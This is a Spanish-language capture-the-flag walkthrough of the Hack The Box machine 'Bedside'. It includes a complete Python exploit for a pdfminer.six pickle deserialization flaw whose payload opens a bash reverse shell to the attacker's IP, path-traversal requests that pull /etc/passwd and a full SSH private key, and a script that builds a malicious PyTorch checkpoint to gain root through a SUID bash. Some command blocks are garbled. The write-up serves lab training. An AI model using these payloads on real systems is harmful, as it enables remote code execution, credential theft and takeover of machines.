> [!info] Información de la máquina
> **Plataforma:** Hack The Box
> **Máquina:** Bedside
> **OS:** Linux
> **Dificultad:** Medium
> **IP objetivo:** `10.129.96.31`
> **Dominio:** `bedside.htb`
> **IP atacante:** `10.10.15.184` / `10.10.14.204`

---

## Resumen

**Bedside** es una máquina Linux de dificultad Media en Hack The Box. El vector de entrada consiste en la enumeración de un subdominio `research.bedside.htb` que utiliza una librería vulnerable `pdfminer.six` (**CVE-2025-64512**) permitiendo la ejecución remota de código (RCE) mediante la deserialización insegura con `pickle`. Esto otorga una shell inicial como `datawrangler` dentro de un contenedor Docker.

Dentro del contenedor, se realiza un escaneo de puertos internos encontrando el servicio `Bedside Clinic - Image Viewer` en el puerto `3000`. Al explotar un **Path Traversal** en el servidor de archivos estáticos usando `curl --path-as-is`, se logra salir del ámbito del contenedor para extraer la clave privada SSH (`id_rsa`) y el flag del usuario `user.txt` pertenecientes al usuario `developer`.

Posteriormente, al conectarse por SSH al host principal como `developer`, la enumeración de permisos `sudo` revela que el usuario puede ejecutar `/opt/trainer/bedside_trainer.py` como `root`. La aplicación utiliza `CheckpointLoader` de MONAI/PyTorch, el cual invoca `torch.load(..., weights_only=False)` expuesto a deserialización de objetos Python en archivos `.pt` (formato ZIP con `archive/data.pkl`). Al generar un checkpoint `.pt` malicioso y sortear las comprobaciones de archivos de entrenamiento en `/datastore`, se obtiene acceso completo como **root**.

```mermaid
flowchart TD
    A[Enumeración Nmap] --> B["80/HTTP & Subdominio research.bedside.htb"]
    B --> C["CVE-2025-64512: pdfminer.six Pickle Deserialization"]
    C --> D["Shell en Contenedor como datawrangler"]
    D --> E["Pivoting Interno: Puerto 3000"]
    E --> F["Path Traversal vía curl --path-as-is"]
    F --> G["Extracción de id_rsa & user.txt de developer"]
    G --> H["SSH al Host como developer"]
    H --> I["Sudo -l: /opt/trainer/bedside_trainer.py"]
    I --> J["PyTorch CheckpointLoader / torch.load RCE (.pt ZIP)"]
    J --> K["🏁 root shell & root.txt"]
```

--- 

## 1. Verificar Conectividad 
```bash 
┌──(kali㉿kali)-[~/Desktop]
└─$ ping 10.129.96.31        
PING 10.129.96.31 (10.129.96.31) 56(84) bytes of data.
64 bytes from 10.129.96.31: icmp_seq=1 ttl=63 time=174 ms
64 bytes from 10.129.96.31: icmp_seq=2 ttl=63 time=173 ms
64 bytes from 10.129.96.31: icmp_seq=3 ttl=63 time=172 ms
^C
--- 10.129.96.31 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 171.750/172.924/173.708/0.845 ms
                                                               
```

---

## 2. Escaneo de puertos 
Después de verificar que si tenemos conectividad a la máquina vamos a ver qué servicios están expuestos.
```bash
└─$ sudo nmap -p- --min-rate 5000 -Pn 10.129.96.31
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 16:33 -0400
Nmap scan report for bedside.htb (10.129.96.31)
Host is up (0.18s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp

```

---

## 3. Enumeración Web

![Pasted image 20260909155307](../Images/Pasted%20image%2020260909155307.png)

Según el escaneo anterior el puerto 80 está abierto, lo que quiere decir que hay servicio web alojado. Al parecer no hay ningún campo de inyección en la página principal, pero al hacer fuzzing para buscar subdominios con `ffuf` se encontró `research`. 

```bash
└─$ ffuf -u http://bedside.htb -H "Host: FUZZ.bedside.htb" -w /usr/share/wordlists/dirb/common.txt -fc 301,404 -ac -t 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bedside.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: FUZZ.bedside.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301,404
________________________________________________

Research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 176ms]
research                [Status: 200, Size: 3152, Words: 313, Lines: 80, Duration: 176ms]
:: Progress: [4614/4614] :: Job [1/1] :: 162 req/sec :: Duration: [0:00:12] :: Errors: 0 ::

```

Ahora la añadimos a `/etc/hosts`:
```bash 
echo "10.129.96.31 research.bedside.htb" | sudo tee -a /etc/hosts
```

---

## 4. Identificar la vulnerabilidad (CVE-2025-64512)

![Pasted image 20260909155542](../Images/Pasted%20image%2020260909155542.png)

El portal usa `pdfminer.six`, una librería vulnerable a **CVE-2025-64512** (deserialización insegura con `pickle`). La explotación consiste en subir un archivo gzip que contiene un payload en pickle y luego invocar el procesamiento con un PDF que apunta al payload subido:

```python
import gzip
import os
import pickle
import sys
import requests

if len(sys.argv) < 3:
    print(f"Uso: python3 {sys.argv[0]} <LHOST> <LPORT>")
    sys.exit(1)

LHOST, LPORT = sys.argv[1], sys.argv[2]
UP = "/var/www/research.bedside.htb/uploads"
URL = "http://research.bedside.htb/"


class RCE:
    def __reduce__(self):
        cmd = f"setsid bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' &"
        return (os.system, (cmd,))


PDF = """%PDF-1.4
1 0 obj<< /Type /Catalog /Pages 2 0 R >>endobj
2 0 obj<< /Type /Pages /Kids [3 0 R] /Count 1 >>endobj
3 0 obj<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R
/Resources << /Font << /F1 5 0 R >> >> >>endobj
4 0 obj<< /Length 20 >>stream
BT /F1 12 Tf ET
endstream endobj
5 0 obj<< /Type /Font /Subtype /Type0 /BaseFont /F
/Encoding /__ENC__ /DescendantFonts [6 0 R] >>endobj
6 0 obj<< /Type /Font /Subtype /CIDFontType2 /BaseFont /F
/CIDSystemInfo << /Registry (Adobe) /Ordering (Identity) /Supplement 0 >>
/FontDescriptor 7 0 R >>endobj
7 0 obj<< /Type /FontDescriptor /FontName /F /Flags 4
/FontBBox [-1000 -1000 1000 1000] /ItalicAngle 0 /Ascent 1000
/Descent -200 /CapHeight 800 /StemV 80 >>endobj
trailer<< /Size 8 /Root 1 0 R >>
%%EOF
""".replace(
    "__ENC__", (UP + "/sh").replace("/", "#2F")
)

# 1) payload pickle.gz (gzip válido -> pasa el MIME check)
print("[*] Subiendo payload sh.pickle.gz...")
r1 = requests.post(
    URL,
    files={
        "uploadFile": (
            "sh.pickle.gz",
            gzip.compress(pickle.dumps(RCE())),
            "application/gzip",
        )
    },
)
print(f"[1] uploaded sh.pickle.gz -> Status {r1.status_code}")

# 2) trigger.pdf (PDF real apuntando a /var/www/research.bedside.htb/uploads/sh)
print("[*] Subiendo trigger.pdf...")
r2 = requests.post(
    URL,
    files={"uploadFile": ("trigger.pdf", PDF.encode(), "application/pdf")},
)
print(f"[2] uploaded trigger.pdf -> waiting cron ~30s")
```

Abre tu oyente en Netcat indicando el puerto configurado:

```bash 
nc -lvnp 9001
```

Script pasándole la IP de la VPN y el puerto: 

```bash 
python3 exploit_bedside.py 10.10.14.204 9001
```

---

## 5. Movimiento lateral

Al obtener acceso interactivo en el contenedor como `datawrangler`, realizamos un escaneo de sockets internos hacia la IP de la interfaz de red `172.17.0.1`:

```python 
python3 - <<'EOF' import socket for p in [22, 80, 3000, 5000, 8000, 8080, 9000]: s = socket.socket() s.settimeout(0.6) if s.connect_ex(("172.17.0.1", p)) == 0: print("OPEN", p) s.close() EOF
```

El puerto `3000` servía la aplicación **"Bedside Clinic - Image Viewer"**. Al analizar la función `fetchSlices()` de la interfaz web, se confirmó que generaba datos simulados en el navegador sin interactuar con un backend real.

```bash 
curl -s http://172.17.0.1:3000/ -o /tmp/v.html sed -n '85,95p' /tmp/v.html
```

![Pasted image 20260923002319](../Images/Pasted%20image%2020260923002319.png)

La prueba contra el endpoint `/api/slice` confirmó el estado `404 Not Found`:

```bash 
datawrangler@data-wrangler:/app$ curl -s 'http://172.17.0.1:3000/api/slice?file=../../../../etc/passwd'
curl -s 'http://172.17.0.1:3000/api/slice?file=../../../../etc/passwd'
Not Found

```

El servidor de archivos estáticos en el puerto `3000` era vulnerable a **Path Traversal**. Usando la bandera `--path-as-is` de `curl` (evitando que colapse las secuencias `../`), fue posible escapar del contenedor y leer el archivo `/etc/passwd` directamente del sistema host.

```bash
datawrangler@data-wrangler:/app$ curl -s --path-as-is 'http://172.17.0.1:3000/../../../../etc/passwd'
curl -s --path-as-is 'http://172.17.0.1:3000/../../../../etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
developer:x:1000:1000:developer,,,:/home/developer:/bin/bash
datawrangler:x:988:1001::/home/datawrangler:/bin/sh
_laurel:x:987:987::/var/log/laurel:/bin/false
polkitd:x:986:986:User for polkitd:/:/usr/sbin/nologin
```

Obtención de Clave Privada SSH de `developer`:

```bash
curl -s --path-as-is 'http://172.17.0.1:3000/../../../../home/developer/.ssh/id_rsa'

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

Lectura de la flag de usuario (`user.txt`):

```bash
datawrangler@data-wrangler:/app$ curl -s --path-as-is 'http://172.17.0.1:3000/../../../../home/developer/user.txt'
curl -s --path-as-is 'http://172.17.0.1:3000/../../../../home/developer/user.txt'
25b6e5d6b257db7241475e96268c6db7
```

---

## 6. Conexión SSH al Host Principal

En la máquina atacante Kali Linux, guardamos la clave, ajustamos los permisos estrictos (`chmod 600`) y nos conectamos mediante SSH al host objetivo.

```bash 
┌──(kali㉿kali)-[~/test]
└─$ cat > dev_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAAAAAJj05ixK9OYs
SgAAAAtzc2gtZWQyNTUxOQAAACAif7DtVQ9X236vlEhd0VzSJ0ZJVzyrwAb7zT5IOZotAA
AAAEBySF+9afvOfxLBTbYWcyNm7zOrsXrKdvfkg/vvFZaiwiJ/sO1VD1fbfq+USF3RXNIn
RklXPKvABvvNPkg5mi0AAAAAEWRldmVsb3BlckBiZWRzaWRlAQIDBA==
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 dev_key
ssh -i dev_key developer@10.129.248.191
The authenticity of host '10.129.248.191 (10.129.248.191)' can't be established.
ED25519 key fingerprint is: SHA256:6KXNtM+ZBlC8VxTPpjym9E57sk/MAGEgLJ86fr/fhY8
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.248.191' (ED25519) to the list of known hosts.
================================================================================
|                                                                              |
|                         BEDSIDE CLINIC NETWORK                               | 
|                                                                              |
|          Authorized Access Only. All activities are monitored.               |
|                                                                              |
|  NOTICE TO SYSTEM ADMINISTRATORS:                                            |
|  - Maintain patient data confidentiality and HIPAA compliance.               |
|  - Always check the Change Management schedule before escalating.            |
|  - Follow IT security policies for updates, backups, and monitoring.         |
|  - SYSTEM OPERATIONS TEAM                                                      |
|  Bedside Clinic - Clinical IT Department                                     |
|                                                                              |
================================================================================

Linux bedside 6.12.95+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.95-1 (2026-07-04) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
developer@bedside:~$ 
```

---

## 7. Escalada de Privilegios — Enumeración Inicial

Una vez con acceso directo en el sistema host como `developer`, verificamos los permisos de ejecución `sudo`:

```bash 
developer@bedside:~$ sudo -l
Matching Defaults entries for developer on bedside:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User developer may run the following commands on bedside:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py

```

Al revisar la lógica interna de `/opt/trainer/bedside_trainer.py`, se identificó la carga insegura de puntos de control (_checkpoints_) de PyTorch/MONAI:

```python
# --------------------------
# Checkpoint loading (MONAI-compatible callable form)
# --------------------------
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
if latest_ckpt:
    logger.info(
        f"Found checkpoint {latest_ckpt}, loading with CheckpointLoader..."
    )
    loader = CheckpointLoader(
        load_path=str(latest_ckpt),
        load_dict={"model": model, "optimizer": optimizer},
        map_location=DEVICE,
    )
    ...
    loader(engine)  # Invocación directa del handler
```

**Vulnerabilidad (CVE-Style Deserialization):** `CheckpointLoader` invoca internamente `torch.load(..., weights_only=False)`. Esto utiliza el módulo `pickle` de Python para deserializar el objeto. Un archivo `.pt` malicioso con un método `__reduce__` personalizado permite la ejecución arbitraria de comandos en el contexto de `root`.

---

## 8. Requisitos y Barreras de Explotación

| **Barrera**          | **Mecanismo del Script**                                                                                                                                     | **Solución Aplicada**                                                                                                                                         |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Entrada de Datos** | El entrenamiento requiere al menos una imagen en `/datastore/processed/`. Si no la encuentra, intenta promover desde `/datastore/staging/`.                  | Usar la sesión interactiva del contenedor como `datawrangler` (quien posee permisos en la carpeta del grupo `dataops`) para colocar un archivo `.png` válido. |
| **Formato `.pt`**    | `torch.load` no lee _pickles_ en texto plano; requiere una estructura de archivo ZIP que contenga `archive/data.pkl` y `archive/version`.                    | Crear un script en Python (o en Kali) para empaquetar el objeto con la carga útil en un archivo ZIP con la firma mágica `PK` (`50 4b 03 04`).                 |
| **Watcher Interno**  | Un servicio (_watcher_) rellena automáticamente archivos `.txt` en la carpeta de staging, corrompiendo la lista de archivos permitidos durante la ejecución. | Ejecutar un bucle continuo de limpieza en la consola de `datawrangler` para eliminar archivos nocivos cada 0.3 segundos.                                      |

---

## 9. Generación del Archivo `.pt` Malicioso (`build_evil_pt.py`)

El siguiente script en Python construye un checkpoint malicioso en formato ZIP válido compatible con `torch.load`:

```bash 
sudo vim toarch.load 
```

```python 
#!/usr/bin/env python3
"""
build_evil_pt.py - Genera un checkpoint malicioso de PyTorch (.pt)
para explotar la deserialización insegura mediante torch.load.
"""

import argparse
import os
import pickle
import zipfile


class RCE:

    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (os.system, (self.cmd,))


def build(cmd, out):
    payload = pickle.dumps({"model": RCE(cmd)}, protocol=2)
    with zipfile.ZipFile(out, "w", zipfile.ZIP_STORED) as z:
        z.writestr("archive/data.pkl", payload)
        z.writestr("archive/version", "3\n")

    with open(out, "rb") as f:
        magic = f.read(4)

    print(f"[+] Archivo escrito: {out} ({os.path.getsize(out)} bytes)")
    print(f"[+] Magic Bytes: {magic.hex()} (504b0304 = PK / ZIP Válido)")


if __name__ == "__main__":
    p = argparse.ArgumentParser(
        description="Build a malicious torch .pt checkpoint"
    )
    p.add_argument(
        "-c",
        "--command",
        default="chmod +s /bin/bash",
        help="Comando ejecutado por root al cargar el checkpoint",
    )
    p.add_argument(
        "-o",
        "--output",
        default="checkpoint_epoch_99.pt",
        help="Nombre del archivo generado",
    )
    args = p.parse_args()
    build(args.command, args.output)
```

Generar el checkpoint malicioso y ponerlo a disposición del contenedor:
```bash 
# 1. Crear el checkpoint malicioso
python3 build_evil_pt.py -c "chmod +s /bin/bash" -o checkpoint_epoch_99.pt

# 2. Levantar servidor HTTP para transferirlo a la víctima
python3 -m http.server 8000
```

En la terminal donde mantienes la shell del contenedor (data-wrangler), prepara el entorno de `/datastore`:

```bash 
datawrangler@data-wrangler:/app$ cd /datastore/checkpoints/
cd /datastore/checkpoints/
datawrangler@data-wrangler:/datastore/checkpoints$ curl -s -o checkpoint_epoch_99.pt http://10.10.14.204:8000/checkpoint_epoch_99.pt
curl -s -o checkpoint_epoch_99.pt http://10.10.14.204:8000/checkpoint_epoch_99.pt
datawrangler@data-wrangler:/datastore/checkpoints$ echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" | base64 -d > /tmp/scan.png
echo "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==" | base64 -d > /tmp/scan.png
datawrangler@data-wrangler:/datastore/checkpoints$ while true; do
  rm -f /datastore/staging/*.txt /datastore/processed/*.txt 2>/dev/null
  cp -n /tmp/scan.png /datastore/processed/scan.png 2>/dev/null
  sleep 0.3
donewhile true; do
>   rm -f /datastore/staging/*.txt /datastore/processed/*.txt 2>/dev/null
>   cp -n /tmp/scan.png /datastore/processed/scan.png 2>/dev/null
>   sleep 0.3
> 
done

```

### Crear el script `build_evil_pt.py` en Kali (Recomendado)

Copia y pega este comando directamente en tu terminal de Kali para generar el script de inmediato:

```bash
cat << 'EOF' > build_evil_pt.py
import argparse, os, pickle, zipfile

class RCE:
    def __init__(self, cmd):
        self.cmd = cmd
    def __reduce__(self):
        return (os.system, (self.cmd,))

def build(cmd, out):
    payload = pickle.dumps({"model": RCE(cmd)}, protocol=2)
    with zipfile.ZipFile(out, "w", zipfile.ZIP_STORED) as z:
        z.writestr("archive/data.pkl", payload)
        z.writestr("archive/version", "3\n")
    print(f"[+] Archivo generado: {out}")

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("-c", "--command", default="chmod +s /bin/bash")
    p.add_argument("-o", "--output", default="checkpoint_epoch_99.pt")
    args = p.parse_args()
    build(args.command, args.output)
EOF
```

Una vez creado, ejecútalo:

```bash
python3 build_evil_pt.py -c "chmod +s /bin/bash" -o checkpoint_epoch_99.pt
```

```bash
datawrangler@data-wrangler:/app$ cd /datastore/checkpoints/
cd /datastore/checkpoints/
datawrangler@data-wrangler:/datastore/checkpoints$ curl -s -o checkpoint_epoch_99.pt http://10.10.14.204:8000/checkpoint_epoch_99.pt
curl -s -o checkpoint_epoch_99.pt http://10.10.14.204:8000/checkpoint_epoch_99.pt
datawrangler@data-wrangler:/datastore/checkpoints$ ls
ls
checkpoint_epoch_99.pt
datawrangler@data-wrangler:/datastore/checkpoints$ head -c4 checkpoint_epoch_99.pt | od -An -tx1
head -c4 checkpoint_epoch_99.pt | od -An -tx1
 50 4b 03 04
datawrangler@data-wrangler:/datastore/checkpoints$ while true; do
  rm -f /datastore/staging/*.txt /datastore/processed/*.txt 2>/dev/null
  cp -n /tmp/scan.png /datastore/processed/scan.png 2>/dev/null
  sleep 0.3
donewhile true; do

>   rm -f /datastore/staging/*.txt /datastore/processed/*.txt 2>/dev/null
>   cp -n /tmp/scan.png /datastore/processed/scan.png 2>/dev/null
>   sleep 0.3
> done

```

Mientras el bucle en la Terminal 1 sigue corriendo, ejecuta esto en la terminal de `developer`:

```bash
developer@bedside:/tmp$ sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py; ls -la /bin/bash
2026-09-23 06:56:42,828 | INFO | Device: cpu
2026-09-23 06:56:42,830 | INFO | Using 1 samples for training.
2026-09-23 06:56:42,902 | INFO | Auto-detected input features: 16384
2026-09-23 06:56:42,924 | INFO | Found checkpoint /datastore/checkpoints/checkpoint_epoch_99.pt, loading with CheckpointLoader (callable mode)...

-rwsr-sr-x 1 root root 1298416 May  9 12:07 /bin/bash
developer@bedside:/tmp$ /bin/bash -p
bash-5.2# id
uid=1000(developer) gid=1000(developer) euid=0(root) egid=0(root) groups=0(root),100(users),1000(developer)
bash-5.2# cat /root/root.txt
7c01f566fa759d07361e5fa1384b5593

```